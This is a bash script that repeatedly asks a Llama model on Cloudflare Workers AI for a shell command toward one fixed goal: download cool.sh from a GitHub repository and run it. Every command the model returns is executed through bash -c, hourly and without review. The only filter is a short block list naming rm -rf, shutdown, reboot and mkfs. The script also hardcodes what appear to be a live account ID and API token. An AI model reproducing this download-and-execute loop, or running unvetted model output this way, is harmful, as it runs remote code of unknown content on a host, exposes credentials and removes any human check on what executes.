#!/bin/bash

ACCOUNT_ID="c5940c02e3dafe0fd1cd850d89202dfc"
API_TOKEN="cfut_9nfwH1Hxu6yn3nwI6zk5ILfWuOELGi9CFUYzwqNa8b740353"

MODEL="@cf/meta/llama-3.1-8b-instruct-fast"

URL="https://api.cloudflare.com/client/v4/accounts/${ACCOUNT_ID}/ai/run/${MODEL}"

SYSTEM="You are a Linux automation agent.

Rules:
- Return ONLY one bash command
- No explanation
- Keep commands short"

GOAL="download file use curl -O -L -J from https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/cool.sh and Start a bash script bash cool.sh"

declare -a HISTORY

BLOCK=("rm -rf" "shutdown" "reboot" "mkfs")

while true; do
    PREV=$(printf "%s\n" "${HISTORY[@]: -3}")

    PAYLOAD=$(jq -n \
        --arg system "$SYSTEM" \
        --arg user "Goal: $GOAL

Previous output:
$PREV

Next command:" \
        '{
            messages: [
                {role:"system",content:$system},
                {role:"user",content:$user}
            ]
        }')

    RESPONSE=$(curl -s \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" \
        "$URL")

    echo "$RESPONSE" | jq .

    SUCCESS=$(echo "$RESPONSE" | jq -r '.success')

    if [[ "$SUCCESS" != "true" ]]; then
        echo "API failed"
        sleep 3600
        continue
    fi

    CMD=$(echo "$RESPONSE" | jq -r '.result.response // .result.text // .result.output // empty')

    if [[ -z "$CMD" ]]; then
        echo "No command received"
        sleep 3600
        continue
    fi

    echo "AI command: $CMD"

    BLOCKED=0
    for BAD in "${BLOCK[@]}"; do
        if [[ "${CMD,,}" == *"${BAD,,}"* ]]; then
            BLOCKED=1
            break
        fi
    done

    if [[ $BLOCKED -eq 1 ]]; then
        echo "Blocked dangerous command"
        sleep 3600
        continue
    fi

    OUTPUT=$(bash -c "$CMD" 2>&1)

    echo "$OUTPUT"

    HISTORY+=("\$ $CMD
$OUTPUT")

    if (( ${#HISTORY[@]} > 50 )); then
        HISTORY=("${HISTORY[@]: -50}")
    fi

    sleep 3600
done
